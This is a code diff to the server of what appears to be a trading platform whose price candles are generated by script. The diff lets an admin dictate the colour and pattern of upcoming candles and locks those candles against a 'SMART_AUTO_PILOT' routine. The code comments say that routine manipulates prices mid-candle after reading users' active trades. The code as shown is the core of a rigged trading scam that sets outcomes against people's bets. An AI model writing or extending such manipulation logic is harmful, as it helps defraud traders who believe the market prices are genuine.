@@ -1,4 +1,4 @@
-// --- START: main app server.js (v30.1 - Perfect Candle Animation, Auto-Pilot & Copy Engine) ---
+// --- START: main app server.js (v30.2 - Perfect Candle Animation, Auto-Pilot & Admin Priority) ---
 
 const express = require('express');
 const http = require('http');
@@ -112,6 +112,9 @@ function generateHistoricalCandle(timestamp, open, isLive = false) {
 
 // 2. Exact Pattern Generator
 function generateDynamicCandle(timestamp, open, command) {
+    command = (command || '').trim(); // Remove accidental spaces
+    
+    // --- RANDOM LOGIC BLOCK ---
     if (command === 'GREEN_RANDOM') {
         const greenPatterns = ['GREEN', 'BULLISH_MARUBOZU', 'GREEN_HAMMER', 'GREEN_SHOOTING_STAR', 'GREEN_SPINNING_TOP'];
         command = greenPatterns[Math.floor(Math.random() * greenPatterns.length)];
@@ -119,6 +122,7 @@ function generateDynamicCandle(timestamp, open, command) {
         const redPatterns = ['RED', 'BEARISH_MARUBOZU', 'RED_HAMMER', 'RED_SHOOTING_STAR', 'RED_SPINNING_TOP'];
         command = redPatterns[Math.floor(Math.random() * redPatterns.length)];
     }
+    // ---------------------------
 
     let bodySize, upperWick, lowerWick, close, high, low;
     const volatility = open * (0.00008 + Math.random() * 0.0001);
@@ -201,6 +205,7 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
         
         if (marketData.nextCandleCommand) {
             newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, marketData.nextCandleCommand);
+            newCandle.isAdminCommand = true; // Lock this candle so AutoPilot cannot change it
             marketData.nextCandleCommand = null;
         } 
         
@@ -345,7 +350,7 @@ function updateRealisticPrice(marketData, candle, currentPeriod) {
     const progress = Math.min(timeElapsed / TIMEFRAME, 1.0);
 
     // --- 🔥 MID-CANDLE SMART MANIPULATION (Smoothly adjusts at 30s mark) 🔥 ---
-    if (timeElapsed >= 30000 && !candle.isMidEvaluated && SMART_AUTO_PILOT) {
+    if (timeElapsed >= 30000 && !candle.isMidEvaluated && SMART_AUTO_PILOT && !candle.isAdminCommand) {
         candle.isMidEvaluated = true;
         
         const trades = activeTradesDb[marketData.marketId] || {};
@@ -975,6 +980,6 @@ setInterval(async () => {
     }
 }, 2000);
 
-app.get('/ping', (_req, res) => res.send('Server V30 - Perfect Animations Active'));
+app.get('/ping', (_req, res) => res.send('Server V30.2 - Random Fix Active'));
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => console.log(`Server running on ${PORT}`));
